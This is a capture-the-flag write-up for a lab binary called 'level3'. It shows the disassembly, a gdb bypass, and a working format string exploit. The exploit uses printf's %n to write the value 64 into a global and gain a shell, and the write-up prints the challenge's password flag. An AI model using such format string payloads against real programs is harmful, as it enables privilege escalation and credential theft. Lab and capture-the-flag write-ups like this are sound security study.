# Write up

While dissassembling the `level3` file, we notice a comparaison including a memory data content :
```
 80484da:	a1 8c 98 04 08       	mov    eax,ds:0x804988c
 80484df:	83 f8 40             	cmp    eax,0x40
 80484e2:	75 34                	jne    8048518 <v+0x74>
```
The checked value is 64 (40 in hex).
Using gdb we force pass this condition :
```
gdb ./level3
(gdb) break main
(gdb) run
(gdb) set {int}0x804988c = 64
(gdp) continue
Continuing.
test
test
Wait what?!
$ cat /home/user/level4/.pass
cat: /home/user/level4/.pass: Permission denied
```
Which gives us a shell, however we don't have the level4 rights since we're using gdb here.

With further investigation, I notice that the printf use as format the inputted string directly :
```
 80484be:	8d 85 f8 fd ff ff    	lea    eax,[ebp-0x208]
 80484c4:	89 04 24             	mov    DWORD PTR [esp],eax
 80484c7:	e8 d4 fe ff ff       	call   80483a0 <fgets@plt>
 80484cc:	8d 85 f8 fd ff ff    	lea    eax,[ebp-0x208]
 80484d2:	89 04 24             	mov    DWORD PTR [esp],eax
 80484d5:	e8 b6 fe ff ff       	call   8048390 <printf@plt>
```
We will then try a Format string exploitation to overwrite this memory value.

As given in the sourced website, we try the `AAAA.%x.%x.%x.%x.` payload first, which gives us :
```
AAAA.200.b7fd1ac0.b7ff37d0.41414141.
```
The forth value is here the AAAA hex ascii value.

We can overwrite the forth %x value to our wanted address with this payload :
```
printf "%b%s" "\x8c\x98\x04\x08" "%x %x %x %x" | ./level3
```
Which `%p` will display `0x804988c`

Note that printf have a `%n` parameter that displays nothing, but store in the given pointer the number of chars already writen.
We currently have 4 + 22 = 26 chars printed, so we will have to edit a bit our payload to reach 64 :
```
(printf "%b%38s%s" "\x8c\x98\x04\x08" "" "%x %x %x %n"; cat) | ./level3
Wait what?!
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```
Which let us get our flag.

## Sources

https://null-byte.wonderhowto.com/how-to/exploit-development-write-specific-values-memory-with-format-string-exploitation-0182112/
https://man.developpez.com/man3/printf/ (Always RTFM)
